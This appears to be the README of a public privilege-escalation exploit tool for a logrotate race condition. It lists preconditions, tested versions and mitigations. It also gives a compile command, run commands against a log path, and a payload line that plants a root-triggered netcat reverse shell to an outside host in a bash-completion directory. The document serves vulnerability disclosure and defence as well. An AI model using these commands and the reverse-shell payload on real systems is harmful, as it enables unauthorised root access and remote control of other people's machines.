# Winning a race condition in logrotate to elevate privileges

## Brief description
  - logrotate is prone to a race condition after renaming the logfile.
  - If logrotate is executed as root, with option that creates a 
    file ( like create, copy, compress, etc.) and the user is in control 
    of the logfile path, it is possible to abuse a race-condition to write 
    files in ANY directories.
  - An attacker could elevate his privileges by writing reverse-shells into 
    directories like "/etc/bash_completition.d/".
 
## Precondition for privilege escalation
  - Logrotate has to be executed as root
  - The logpath needs to be in control of the attacker
  - Any option that creates files is set in the logrotate configuration

## Tested version
  - Debian GNU/Linux 9.5 (stretch)
  - Amazon Linux 2 AMI (HVM)
  - Ubuntu 18.04.1
  - logrotate 3.8.6
  - logrotate 3.11.0
  - logrotate 3.15.0

## Compile
  - gcc -o logrotten logrotten.c

## Prepare payload
```
echo "if [ `id -u` -eq 0 ]; then (/bin/nc -e /bin/bash myhost 3333 &); fi" > payloadfile
```

## Run exploit 

If "create"-option is set in logrotate.cfg:
```
./logrotten -p ./payloadfile /tmp/log/pwnme.log
```

If "compress"-option is set in logrotate.cfg:
```
./logrotten -p ./payloadfile -c -s 4 /tmp/log/pwnme.log
```


## Known Problems
  - It's hard to win the race inside a docker container or on a lvm2-volume

## Mitigation
  - make sure that logpath is owned by root
  - use option "su" in logrotate.cfg
  - use selinux or apparmor

## Author
  - Wolfgang Hotwagner

## References
  - https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition
  - https://tech.feedyourhead.at/content/abusing-a-race-condition-in-logrotate-to-elevate-privileges
  - https://github.com/whotwagner/logrotten
  - https://www.ait.ac.at/themen/cyber-security/ait-sa-20190930-01/
  - https://tech.feedyourhead.at/content/privilege-escalation-in-groonga-httpd

